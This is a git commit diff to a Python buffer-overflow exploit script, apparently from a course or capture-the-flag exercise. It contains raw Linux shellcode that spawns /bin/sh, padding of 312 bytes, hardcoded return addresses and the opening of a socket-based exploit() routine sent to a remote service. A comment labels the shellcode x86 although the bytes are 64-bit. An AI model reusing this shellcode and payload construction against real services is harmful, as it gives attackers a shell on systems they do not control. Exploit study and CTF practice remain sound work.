610e40835f33ef2ed47e89ad0b4cbeb5ca85a4cf
Khalil El Hage Kassem <90007227+Khalil002@users.noreply.github.com>
2025-10-02 00:40:15 +0200

    b

--- c8/m.py
+++ c8/m.py
@@ -9,10 +9,10 @@ def pad_payload(payload: bytes, target_len: int) -> bytes:
 # Shellcode: execve("/bin/sh", NULL, NULL)
 # This is a standard x86 Linux shellcode
 shellcode=  b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05"
-padding=    b"\x90" * 312
+padding=    pad_payload(shellcode, 312)
 returnAddr= b"\x68\x0E\x01\x76\xB7\x7C\x00\x00" #This is an example, we need a working return address to the global Buffer
 returnAddr= b"\x00\x41\x40\x00\x00\x00\x00\x00"
-payload = shellcode+padding+returnAddr
+payload = padding+returnAddr
 def exploit():
     # Connect to the service
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
